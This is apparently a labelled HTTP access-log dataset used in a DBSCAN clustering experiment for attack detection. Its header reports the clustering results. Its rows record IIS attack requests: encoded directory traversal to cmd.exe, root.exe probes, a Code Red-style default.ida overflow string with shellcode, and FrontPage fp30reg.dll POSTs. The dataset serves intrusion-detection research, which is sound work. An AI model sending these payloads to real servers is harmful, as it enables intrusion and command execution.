#------------------------------------------------------------------------------------------------------------
#  ~ DateTime: 2021-02-09 00:10:18
#  ~ Dataframe name: "http_access_log"
#  ~ Number of events in the dataframe: 3554
#  ~ Number of unique labels ('label_event_type') in the dataframe: 12
#  ~ Selected features set for the clustering: ['HTTP_method', 'ClientRequestLine@', 'StatusCode', 'ObjectSize~', 'Referrer~', 'Agent@']
#  ~ The dataframe was scaled using the scaler: MinMaxScaler
#  ~ Parameters:  EPS=0.10286568826994683  MinPts=2 (The EPS parameter was calculated in 0.011141 seconds)
#  ~ The DBSCAN clustering process was performed in 0.162435 seconds
#  ~ Results summary: (20 Clus. | 5 Outl. | Homg.: 99.93% | Comp.: 93.22% | V-measure: 96.46% | AR: 97.24% | AMI: 96.41%)
#
#  ~ Details of clusters:
#       Cluster [0] contains 484 items. MV:["A050"]. Details:{'A05': 484}
#       Cluster [1] contains 979 items. MV:["A011"]. Details:{'A01': 979}
#       Cluster [2] contains 109 items. MV:["A022"]. Details:{'A02': 109}
#       Cluster [3] contains 86 items. MV:["A053"]. Details:{'A05': 86}
#       Cluster [4] contains 587 items. MV:["A034"]. Details:{'A03': 587}
#       Cluster [5] contains 23 items. MV:["A045"]. Details:{'A04': 23}
#       Cluster [6] contains 14 items. MV:["A046"]. Details:{'A04': 14}
#       Cluster [7] contains 3 items. MV:["A037"]. Details:{'A03': 3}
#       Cluster [8] contains 46 items. MV:["A098"]. Details:{'A09': 46}
#       Cluster [9] contains 100 items. MV:["A089"]. Details:{'A08': 100}
#       Cluster [10] contains 125 items. MV:["A0610"]. Details:{'A06': 125}
#       Cluster [11] contains 16 items. MV:["A0411"]. Details:{'A04': 16}
#       Cluster [12] contains 32 items. MV:["A0812"]. Details:{'A08': 32}
#       Cluster [13] contains 769 items. MV:["A1013"]. Details:{'A10': 769}
#       Cluster [14] contains 14 items. MV:["A1114"]. Details:{'A11': 14}
#       Cluster [15] contains 54 items. MV:["A1115"]. Details:{'A05': 1, 'A11': 53}
#       Cluster [16] contains 5 items. MV:["A0416"]. Details:{'A04': 5}
#       Cluster [17] contains 57 items. MV:["A1217"]. Details:{'A12': 57}
#       Cluster [18] contains 23 items. MV:["A0718"]. Details:{'A07': 23}
#       Cluster [19] contains 23 items. MV:["A1119"]. Details:{'A11': 23}
#
#  ~ Details of outliers: {'A03': 1, 'A04': 1, 'A05': 3}
#
#  ~ Confusion matrix:
#     +--------+-----------------------------------------------------------------------------------+
#     | Actual +                                    Predicted                                      |
#     +--------+------+------+------+------+------+------+------+------+------+------+------+------+
#     |        | A01  | A02  | A03  | A04  | A05  | A06  | A07  | A08  | A09  | A10  | A11  | A12  |
#     +--------+------+------+------+------+------+------+------+------+------+------+------+------+
#     |  A01   | 979  |      |      |      |      |      |      |      |      |      |      |      |
#     |  A02   |      | 109  |      |      |      |      |      |      |      |      |      |      |
#     |  A03   |      |      | 590  |      |      |      |      |      |      |      |      |      |
#     |  A04   |      |      |      |  58  |      |      |      |      |      |      |      |      |
#     |  A05   |      |      |      |      | 570  |      |      |      |      |      |  1   |      |
#     |  A06   |      |      |      |      |      | 125  |      |      |      |      |      |      |
#     |  A07   |      |      |      |      |      |      |  23  |      |      |      |      |      |
#     |  A08   |      |      |      |      |      |      |      | 132  |      |      |      |      |
#     |  A09   |      |      |      |      |      |      |      |      |  46  |      |      |      |
#     |  A10   |      |      |      |      |      |      |      |      |      | 769  |      |      |
#     |  A11   |      |      |      |      |      |      |      |      |      |      |  90  |      |
#     |  A12   |      |      |      |      |      |      |      |      |      |      |      |  57  |
#     +--------+------+------+------+------+------+------+------+------+------+------+------+------+
#
#  ~ Note: to import this file into Python, use: "DF = pandas.read_csv(file_name, sep=',', comment='#')"
#
#------------------------------------------------------------------------------------------------------------
DateTime~,Referrer~,ClientRequestLine@,Agent@,ObjectSize~,Http_protocol@,HTTP_method,ClientIP$,StatusCode,label_event_type~,label_IPpair_ID~,phase1_predicted_label~
1107112422,"-","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9069233130234,"'404'","A01","S544","A_1"
1107112422,"-","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9069233130234,"'404'","A01","S544","A_1"
1107112423,"-","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9069233130234,"'404'","A01","S544","A_1"
1107112423,"-","/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9069233130234,"'404'","A01","S544","A_1"
1107112424,"-","/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9069233130234,"'404'","A01","S544","A_1"
1107112424,"-","/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9069233130234,"'404'","A01","S544","A_1"
1107112425,"-","/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir","-",974,"HTTP/1.0","GET",9069233130234,"'400'","A02","S544","A_2"
1107112425,"-","/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir","-",974,"HTTP/1.0","GET",9069233130234,"'400'","A02","S544","A_2"
1107112426,"-","/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9069233130234,"'404'","A01","S544","A_1"
1107112426,"-","/scripts/..%252f../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9069233130234,"'404'","A01","S544","A_1"
1107116016,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9218026187153,"'403'","A05","S205","A_0"
1107117575,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9202253200065,"'403'","A05","S80","A_0"
1107119002,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9218074023091,"'403'","A05","S219","A_0"
1107129012,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9061190072114,"'403'","A05","S402","A_0"
1107131423,"-","/scripts/root.exe?/c+dir","-",1041,"HTTP/1.0","GET",9067181019171,"'404'","A01","S506","A_1"
1107131423,"-","/MSADC/root.exe?/c+dir","-",1041,"HTTP/1.0","GET",9067181019171,"'404'","A01","S506","A_1"
1107131423,"-","/c/winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9067181019171,"'404'","A01","S506","A_1"
1107131424,"-","/d/winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9067181019171,"'404'","A01","S506","A_1"
1107131424,"-","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9067181019171,"'404'","A01","S506","A_1"
1107131424,"-","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9067181019171,"'404'","A01","S506","A_1"
1107131424,"-","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9067181019171,"'404'","A01","S506","A_1"
1107131425,"-","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9067181019171,"'404'","A01","S506","A_1"
1107131425,"-","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9067181019171,"'404'","A01","S506","A_1"
1107131425,"-","/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9067181019171,"'404'","A01","S506","A_1"
1107131425,"-","/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9067181019171,"'404'","A01","S506","A_1"
1107131426,"-","/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9067181019171,"'404'","A01","S506","A_1"
1107131426,"-","/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir","-",974,"HTTP/1.0","GET",9067181019171,"'400'","A02","S506","A_2"
1107131426,"-","/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir","-",974,"HTTP/1.0","GET",9067181019171,"'400'","A02","S506","A_2"
1107131426,"-","/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9067181019171,"'404'","A01","S506","A_1"
1107131427,"-","/scripts/..%252f../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9067181019171,"'404'","A01","S506","A_1"
1107134072,"-","/sumthin","-",1061,"HTTP/1.0","GET",9211022073068,"'404'","A01","S151","A_1"
1107134072,"-","/sumthin","-",1061,"HTTP/1.0","GET",9211022073068,"'404'","A01","S151","A_1"
1107134076,"-","/sumthin","-",1061,"HTTP/1.0","GET",9211022073068,"'404'","A01","S151","A_1"
1107134076,"-","/sumthin","-",1061,"HTTP/1.0","GET",9211022073068,"'404'","A01","S151","A_1"
1107134076,"-","/sumthin","-",1061,"HTTP/1.0","GET",9211022073068,"'404'","A01","S151","A_1"
1107134080,"-","/sumthin","-",1061,"HTTP/1.0","GET",9211022073068,"'404'","A01","S151","A_1"
1107137140,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9211022102234,"'403'","A05","S150","A_0"
1107137918,"-","/default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a","-",1061,"HTTP/1.0","GET",9065202015194,"'404'","A01","S460","A_1"
1107141975,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9061010007127,"'403'","A05","S362","A_0"
1107143898,"-","/scripts/root.exe?/c+dir","-",1041,"HTTP/1.0","GET",9218028040100,"'404'","A01","S207","A_1"
1107143900,"-","/MSADC/root.exe?/c+dir","-",1041,"HTTP/1.0","GET",9218028040100,"'404'","A01","S207","A_1"
1107143903,"-","/c/winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9218028040100,"'404'","A01","S207","A_1"
1107143905,"-","/d/winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9218028040100,"'404'","A01","S207","A_1"
1107143908,"-","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9218028040100,"'404'","A01","S207","A_1"
1107143910,"-","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9218028040100,"'404'","A01","S207","A_1"
1107143916,"-","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9218028040100,"'404'","A01","S207","A_1"
1107143921,"-","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9218028040100,"'404'","A01","S207","A_1"
1107148776,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9061183208219,"'403'","A05","S399","A_0"
1107152444,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9210022146234,"'403'","A05","S128","A_0"
1107157725,"-","/","-",2898,"HTTP/1.1","GET",9068214068216,"'403'","A05","S520","A_3"
1107160164,"-","/","-",2898,"HTTP/1.1","GET",9068214068216,"'403'","A05","S520","A_3"
1107165247,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9065122119010,"'403'","A05","S454","A_0"
1107178762,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9222166160129,"'403'","A05","S291","A_0"
1107198001,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9066255109222,"'403'","A05","S481","A_0"
1107199684,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9199063000001,"'403'","A05","S60","A_0"
1107207292,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9024094203115,"'403'","A05","S344","A_0"
1107209989,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9221079146007,"'403'","A05","S286","A_0"
1107213320,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9070048009026,"'403'","A05","S561","A_0"
1107213587,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9222166160087,"'403'","A05","S311","A_0"
1107213653,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9070183086076,"'403'","A05","S560","A_0"
1107232859,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9062177153106,"'403'","A05","S420","A_0"
1107246256,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9218022120198,"'403'","A05","S195","A_0"
1107248045,"-","/_vti_bin/_vti_aut/fp30reg.dll","-",407,"HTTP/1.1","POST",9065117045251,"'404'","A03","S453","A_4"
1107248045,"-","/_vti_bin/_vti_aut/fp30reg.dll","-",407,"HTTP/1.1","POST",9065117045251,"'404'","A03","S453","A_4"
1107248047,"-","/_vti_bin/_vti_aut/fp30reg.dll","-",407,"HTTP/1.1","POST",9065117045251,"'404'","A03","S453","A_4"
1107248047,"-","/_vti_bin/_vti_aut/fp30reg.dll","-",407,"HTTP/1.1","POST",9065117045251,"'404'","A03","S453","A_4"
1107248047,"-","/_vti_bin/_vti_aut/fp30reg.dll","-",407,"HTTP/1.1","POST",9065117045251,"'404'","A03","S453","A_4"
1107248047,"-","/_vti_bin/_vti_aut/fp30reg.dll","-",407,"HTTP/1.1","POST",9065117045251,"'404'","A03","S453","A_4"
1107248047,"-","/_vti_bin/_vti_aut/fp30reg.dll","-",407,"HTTP/1.1","POST",9065117045251,"'404'","A03","S453","A_4"
1107248047,"-","/_vti_bin/_vti_aut/fp30reg.dll","-",407,"HTTP/1.1","POST",9065117045251,"'404'","A03","S453","A_4"
1107248047,"-","/_vti_bin/_vti_aut/fp30reg.dll","-",407,"HTTP/1.1","POST",9065117045251,"'404'","A03","S453","A_4"
1107248046,"-","/_vti_bin/_vti_aut/fp30reg.dll","-",407,"HTTP/1.1","POST",9065117045251,"'404'","A03","S453","A_4"
1107248047,"-","/_vti_bin/_vti_aut/fp30reg.dll","-",407,"HTTP/1.1","POST",9065117045251,"'404'","A03","S453","A_4"
1107248045,"-","/_vti_bin/_vti_aut/fp30reg.dll","-",407,"HTTP/1.1","POST",9065117045251,"'404'","A03","S453","A_4"
1107248045,"-","/_vti_bin/_vti_aut/fp30reg.dll","-",407,"HTTP/1.1","POST",9065117045251,"'404'","A03","S453","A_4"
1107248045,"-","/_vti_bin/_vti_aut/fp30reg.dll","-",407,"HTTP/1.1","POST",9065117045251,"'404'","A03","S453","A_4"
1107248045,"-","/_vti_bin/_vti_aut/fp30reg.dll","-",407,"HTTP/1.1","POST",9065117045251,"'404'","A03","S453","A_4"
1107248045,"-","/_vti_bin/_vti_aut/fp30reg.dll","-",407,"HTTP/1.1","POST",9065117045251,"'404'","A03","S453","A_4"
1107248045,"-","/_vti_bin/_vti_aut/fp30reg.dll","-",407,"HTTP/1.1","POST",9065117045251,"'404'","A03","S453","A_4"
1107248049,"-","/_vti_bin/_vti_aut/fp30reg.dll","-",407,"HTTP/1.1","POST",9065117045251,"'404'","A03","S453","A_4"
1107248049,"-","/_vti_bin/_vti_aut/fp30reg.dll","-",407,"HTTP/1.1","POST",9065117045251,"'404'","A03","S453","A_4"
1107248049,"-","/_vti_bin/_vti_aut/fp30reg.dll","-",407,"HTTP/1.1","POST",9065117045251,"'404'","A03","S453","A_4"
1107248049,"-","/_vti_bin/_vti_aut/fp30reg.dll","-",407,"HTTP/1.1","POST",9065117045251,"'404'","A03","S453","A_4"
1107248049,"-","/_vti_bin/_vti_aut/fp30reg.dll","-",407,"HTTP/1.1","POST",9065117045251,"'404'","A03","S453","A_4"
1107248049,"-","/_vti_bin/_vti_aut/fp30reg.dll","-",407,"HTTP/1.1","POST",9065117045251,"'404'","A03","S453","A_4"
1107249290,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9222083129198,"'403'","A05","S316","A_0"
1107257372,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9216070251002,"'403'","A05","S171","A_0"
1107259674,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9068223144102,"'403'","A05","S522","A_0"
1107264790,"-","/scripts/root.exe?/c+dir","-",1041,"HTTP/1.0","GET",9221184100013,"'404'","A01","S276","A_1"
1107264790,"-","/MSADC/root.exe?/c+dir","-",1041,"HTTP/1.0","GET",9221184100013,"'404'","A01","S276","A_1"
1107264791,"-","/c/winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9221184100013,"'404'","A01","S276","A_1"
1107264791,"-","/d/winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9221184100013,"'404'","A01","S276","A_1"
1107264792,"-","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9221184100013,"'404'","A01","S276","A_1"
1107264796,"-","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9221184100013,"'404'","A01","S276","A_1"
1107264796,"-","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9221184100013,"'404'","A01","S276","A_1"
1107264797,"-","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9221184100013,"'404'","A01","S276","A_1"
1107264797,"-","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9221184100013,"'404'","A01","S276","A_1"
1107264798,"-","/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9221184100013,"'404'","A01","S276","A_1"
1107264798,"-","/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9221184100013,"'404'","A01","S276","A_1"
1107264799,"-","/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9221184100013,"'404'","A01","S276","A_1"
1107264799,"-","/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir","-",974,"HTTP/1.0","GET",9221184100013,"'400'","A02","S276","A_2"
1107264800,"-","/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir","-",974,"HTTP/1.0","GET",9221184100013,"'400'","A02","S276","A_2"
